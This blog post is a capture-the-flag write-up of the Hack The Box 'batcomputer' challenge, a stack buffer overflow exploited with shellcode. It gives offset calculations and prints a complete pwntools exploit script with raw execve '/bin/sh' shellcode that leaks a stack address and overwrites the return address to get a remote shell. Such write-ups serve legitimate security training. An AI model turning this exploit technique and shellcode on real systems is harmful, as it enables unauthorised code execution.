---
layout: post
title:  Hack the Box rev batcomputer 
image: /assets/img/HTB-Logo.png
date:   2022-12-12 11:15:01
tags:
- rev
description: Basic rev challenge
categories:
- Hack The Box
---


batcomputer 
This challenge is about a buffer overflow, a shellcode and a bug i found in the gdb

First of all if you have push rsp and input ni in the gdb it will be like it executed a function (it happened to me during shellcode debugging)

Now the challenge:


Determining the buffer offset and length:

![](assets/img/2022-09-16-12-11-06.png)

var60 is at 96 bytes away from the stack pointer as seen below:
![](assets/img/2022-09-16-12-11-54.png)

but the function adds 0x14 to the address so we are 76 bytes away from the stack and 84 away from the return 

The shellcode is from https://www.exploit-db.com/exploits/42179 :

The buffer variable can be seen in the comments here as well as the way we use after to get to the return:
![](assets/img/2022-09-16-12-29-20.png)

The payload:
```
sender=asm(shellcode, arch = 'amd64')	

context.update(arch='amd64', os='linux')

#io = process("./batcomputer")
io=remote('178.62.82.68',31321)
#io=gdb.debug("./batcomputer",'break read ')
io.sendline('1')
io.sendline('2')
shellcode=b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"



io.sendline('b4tp@$$w0rd!')
io.recvuntil('It was very hard, but Alfred managed to locate him: ')
address=io.recvline().strip()
firstinst="push rax\n push rbx\nmov rsp,"+hex(int(address.decode(),16)-100)
shellcode=asm(firstinst)+shellcode

print(sender)
print(len(shellcraft.sh()))
sender= shellcode+asm(shellcraft.nop())*(76-len(shellcode))+8*b'a'+p64(int(address,16))
print(address)
print(len(sender))
io.send(sender)

io.sendline('3')
io.interactive()
```
